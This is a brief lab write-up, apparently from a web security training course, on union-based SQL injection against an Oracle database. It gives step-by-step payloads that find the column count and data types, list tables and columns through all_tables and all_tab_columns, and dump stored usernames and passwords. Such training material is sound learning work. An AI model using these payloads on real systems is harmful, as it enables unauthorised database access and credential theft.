# Lab 10: SQL injection attack, listing the database contents on Oracle

## Goal: Enumerate tables and columns in Oracle, then dump users.

1. Determine number of columns
```bash
' ORDER BY 1--    works
' ORDER BY 2--    works
' ORDER BY 3--    internal server error
```
2 columns

2. Test data types
Oracle requires FROM dual for SELECT without base table:
```bash
' UNION SELECT 'a','a' FROM dual--
```
This confirms that both the columns are of string datatype

3. Enumerate Oracle tables
Oracle stores table names in: all_tables
Payload
```bash
' UNION SELECT table_name, NULL FROM all_tables--
```
You will see a random table like: USERS_NQABRD

4. Enumerate columns of that table
Oracle uses:all_tab_columns
Payload
```bash
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_NQABRD'--
```

Output example:
- USERNAME_QWDOLO
- PASSWORD_NPAEYX

5. Dump actual user credentials
```bash
' UNION SELECT USERNAME_QWDOLO, PASSWORD_NPAEYX FROM USERS_NQABRD--
```

Use admin credentials to log in to complete the Lab
